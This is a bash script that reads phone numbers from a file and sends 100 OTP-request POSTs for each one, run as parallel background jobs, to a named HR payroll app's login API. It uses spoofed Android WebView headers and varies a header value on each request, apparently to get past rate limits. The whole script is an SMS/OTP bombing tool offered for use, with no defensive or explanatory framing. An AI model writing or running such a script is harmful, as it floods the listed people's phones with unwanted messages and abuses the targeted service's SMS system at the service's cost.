#!/bin/bash

# URL and request details
url="https://digitalhrpaybook.parekhinfra.com/api/v1/app-users/request-otp"
headers=(
  "Content-Type: application/json"
  "Accept: application/json, text/plain, */*"
  "User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_x86_64 Build/RSR1.210722.013.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
  "Origin: http://127.0.0.1"
  "X-Requested-With: com.harish.digitclone"
  "Sec-Fetch-Site: cross-site"
  "Sec-Fetch-Mode: cors"
  "Sec-Fetch-Dest: empty"
  "Referer: http://127.0.0.1/login"
  "Accept-Encoding: gzip, deflate, br"
)

# Initialize an empty array for phone numbers
phone_numbers=()

# Function to read phone numbers from a text file
read_phone_numbers_from_file() {
  local file="$1"
  while IFS= read -r line; do
    phone_numbers+=("$line")
  done < "$file"
}

# Prompt the user for the phone numbers file name
read -p "Enter the name of the text file containing phone numbers (e.g., phone_numbers.txt): " phone_numbers_file

# Call the function to read phone numbers from the specified file
read_phone_numbers_from_file "$phone_numbers_file"

# Log file to store responses
log_file="response_log.txt"
echo "Logging responses to $log_file"

# Send request 100 times for each phone number in parallel
for ((i=1; i<=100; i++)); do
  for phone_number in "${phone_numbers[@]}"; do
    # Change the q value dynamically (for example, cycling through values)
    q_value=$(echo "scale=2; $i/100" | bc) # Generates values from 0.01 to 1.00
    headers[9]="Accept-Language: en-US,en;q=$q_value" # Update the Accept-Language header

    data="{\"name\":\"\",\"phone_number\":\"$phone_number\",\"otp\":\"\"}"
    
    # Sending the POST request using curl with the specified headers in the background
    {
      response=$(curl -s -o response_temp.json -w "%{http_code}" -X POST "$url" \
        -H "${headers[0]}" \
        -H "${headers[1]}" \
        -H "${headers[2]}" \
        -H "${headers[3]}" \
        -H "${headers[4]}" \
        -H "${headers[5]}" \
        -H "${headers[6]}" \
        -H "${headers[7]}" \
        -H "${headers[8]}" \
        -H "${headers[9]}" \
        -d "$data")

      # Check if the request was successful
      if [[ "$response" -eq 200 ]]; then
        echo "Request successful for $phone_number. Response:"
        cat response_temp.json
        echo >> "$log_file" # Add a newline for separation in log
        cat response_temp.json >> "$log_file"
      else
        echo "Request failed for $phone_number. HTTP Status: $response"
      fi
    } & # Run this block in the background

    sleep 1 # Optional: Add a short delay to avoid overwhelming the server
  done
done

# Wait for all background jobs to finish
wait

# Clean up temporary response file
rm response_temp.json
